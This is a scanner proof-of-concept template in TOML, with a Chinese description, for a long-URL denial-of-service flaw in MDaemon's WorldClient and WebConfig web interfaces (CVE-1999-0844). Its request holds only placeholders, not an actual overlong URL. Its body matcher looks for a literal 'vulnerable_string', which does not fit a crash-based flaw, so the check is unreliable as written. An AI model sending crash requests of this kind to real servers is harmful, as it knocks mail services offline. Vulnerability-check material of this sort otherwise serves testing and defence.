[info]
author = "ave"
description = "向 MDaemon WorldClient Web 邮件服务或 WebConfig 管理接口发送超长 URL 请求，触发缓冲区溢出或资源耗尽，导致服务崩溃或无法正常响应。"
id = "POC-AVE-1999-0638"
name = "MDaemon WorldClient/WebConfig 长 URL 拒绝服务漏洞 PoC"
severity = "high"
tags = ["ave-1999-0638"]
vuln_id = [
    "CVE-1999-0844",
    "AVE-1999-0638",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{request_path}}"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["vulnerable_string"]
